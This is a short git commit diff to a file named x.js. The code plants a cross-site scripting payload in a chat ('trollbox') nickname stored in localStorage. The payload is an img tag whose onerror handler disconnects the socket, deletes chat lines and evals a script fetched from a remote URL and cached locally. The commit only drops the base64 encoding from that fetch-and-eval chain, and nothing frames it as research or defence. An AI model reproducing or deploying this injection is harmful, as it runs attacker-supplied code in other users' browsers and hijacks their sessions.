1f04c50c54b6717ca4d93f322270ff74cca6393c
dell-optiplex-790 <dell.optiplex.d4719126@gmail.com>
2024-10-29 15:10:25 +0100

    Update x.js

--- x.js
+++ x.js
@@ -6,8 +6,8 @@ if(!localStorage.getItem('.config/trollbox/tbjb')) {
 	localStorage.setItem('.config/trollbox/_nick',
 		localStorage.getItem('.config/trollbox/nick'));
 
-	localStorage.setItem('.config/trollbox/nick', \`tbjb<img src='https://' onerror='document.querySelector("#trollbox_nick_btn").innerText=localStorage.getItem(".config/trollbox/_nick");socket.disconnect(),document.body.querySelectorAll(".trollbox_line").forEach(e=>e.parentElement.removeChild(e));eval(atob(localStorage.getItem(".config/trollbox/tbjb")))'>\`);
-	localStorage.setItem('.config/trollbox/tbjb', btoa(await (await fetch('<!site>tb.js')).text()))
+	localStorage.setItem('.config/trollbox/nick', \`tbjb<img src='https://' onerror='document.querySelector("#trollbox_nick_btn").innerText=localStorage.getItem(".config/trollbox/_nick");socket.disconnect(),document.body.querySelectorAll(".trollbox_line").forEach(e=>e.parentElement.removeChild(e));eval(localStorage.getItem(".config/trollbox/tbjb"))'>\`);
+	localStorage.setItem('.config/trollbox/tbjb', await (await fetch('<!site>tb.js')).text())
 }
 }e()
 </script>
